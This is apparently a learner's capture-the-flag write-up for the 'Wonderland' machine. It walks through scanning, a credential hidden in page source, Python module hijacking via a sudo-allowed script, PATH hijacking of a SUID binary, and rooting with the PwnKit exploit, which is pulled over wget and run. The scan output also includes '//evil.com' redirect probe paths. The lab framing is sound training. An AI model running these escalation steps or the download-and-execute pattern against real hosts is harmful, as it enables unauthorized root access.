

nmap scan 

```
nmap -sV -A [ip] 
```

```output
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**PORT 80**

ffuf scan 

```
./ffuf -u http://10.112.132.0/FUZZ -w ../Wordlists/Websites/ffuf-wordlist.txt -r
```

```

img                     [Status: 200, Size: 153, Words: 4, Lines: 6, Duration: 20ms]
r                       [Status: 200, Size: 258, Words: 37, Lines: 9, Duration: 24ms]
index.html              [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 20ms]
/#.htaccess#            [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 24ms]
///evil.com/%2F..       [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 19ms]
//evil.com/%2F..        [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 21ms]
poem                    [Status: 200, Size: 1565, Words: 426, Lines: 42, Duration: 19ms]
```

nothin particualar in img or poem.

'/r' contain a hint... 'Keep Going'

So i decided to fuzz /r 
If we'll keep doing this we get a folowing path 
'r/a/b/b/i/t' 
this is a final page

In the source view we can see this hidden line 
'<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>'
It looks like a login and password.

Lets try to connect to ssh

**PORT 22**

[rabbit] 
this is how alice home directory looks like: 

```
alice@wonderland:~$ ll
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 ./
drwxr-xr-x 6 root  root  4096 May 25  2020 ../
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache/
drwx------ 3 alice alice 4096 May 25  2020 .gnupg/
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local/
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

We can see two useful things.
1. The first one is a root.txt file. This the final flag we have to read. 
2. Python file. if we look into 
```
sudo -l 
```
we get a folowing output 
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
so we can run this this command as a rabbit user. 

***Python file***
The python file prints out random lines using:
```
line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
we can try to replace random.choice with our own function.
In order to do this we have to create a file called random with a choice function in it 
In this function we will try to open a reverse shell to connect to the rabbit user

the reverse shell didn't work because of lack of permissions so i looked up other ways....
this is a working script 
```
import os

def choice(a):
  os.system("/bin/bash")
```

i feel stupid...

[hatter]

```
rabbit@wonderland:/home/rabbit$ ll

total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 ./
drwxr-xr-x 6 root   root    4096 May 25  2020 ../
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty*
```

if we cat the 'teaParty' (that uses suid) we can find folowing line:
```
/bin/echo -n 'Probably by ' && date --date='next hour'
```

now there is smth we can do with this date command...
we can create a file with a same name and add it to the path so our corrent directory is the first place the os will look for 'date' command in.

```
export PATH=/home/rabbit:$PATH
```

```date
#!/bin/bash

/bin/bash
```

this will run a bash session as a hatter

[hatter]

in the hatter home directory there is a file called password.txt
that conatains folowwing:

```
WhyIsARavenLikeAWritingDesk?
```

this is a password for a hatter user. Now we can ssh to him.

This user seems like a deadend. i didn't know what to do so I checked a writeup.
A common solution is to use linpeas for a privesc 
I downloaded it on my maschine and then transfered it via 
```
python3 -m http.server 8000
```
and 
```
wget [ip]:8000/linpeas
chmod +x linpeas
```

After a ran it a found a CVE-2021-4034 so i checked if my maschine patched.

```
pkexec --version
ls -l /usr/bin/pkexec
dpkg -s policykit-1 | grep Version
```

Everythin checked out so i looked for an exploit on github and transfered the shell-script the same way 
```
python3 -m http.server 8000
```
and 
```
wget [ip]:8000/PwnKit 
chmod +x PwnKit
./PwnKit
```

After i ran the command i got the root access

[root]

Now everything that's left is to cat the root.txt and user.txt and we're done.

```
cat /home/alice/root.txt 
```

lets find the user.txt file

```
find / -name user.txt 2>/dev/null
cat /root/user.txt
```

Were done. that was my hardest ctf yet but i loved it. i learned a lot.

